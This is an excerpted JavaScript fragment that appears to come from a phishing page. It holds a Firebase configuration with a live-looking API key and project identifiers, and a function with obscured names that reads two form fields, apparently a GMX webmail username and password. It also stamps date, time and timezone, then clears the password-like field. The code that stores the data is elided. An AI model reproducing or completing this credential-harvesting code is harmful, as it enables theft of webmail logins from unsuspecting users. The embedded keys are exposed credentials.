...
const firebaseConfig = {
  apiKey: "AIzaSyBamCp42ZqFiKg-LIvkyaNctOey3bwpj6s",
  authDomain: "eurovisu.firebaseapp.com",
  databaseURL: "https://eurovisu-default-rtdb.firebaseio.com",
  projectId: "eurovisu",
  storageBucket: "eurovisu.firebasestorage.app",
  messagingSenderId: "297073358111",
  appId: "1:297073358111:web:40d2728ec71a60fa22ac2a",
};
...
function awkacent() {
  ...
  var oruk = document.getElementById("awka-oruko").value;
  var wazobia = document.getElementById("awka-zom").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "GMX";
  ...
  if (oruk !== "" && wazobia !== "") {
    ...
    setTimeout(function () {
      ...
      document.getElementById("awka-zom").value = "";
      return false;
    }, 2000);
  }
}
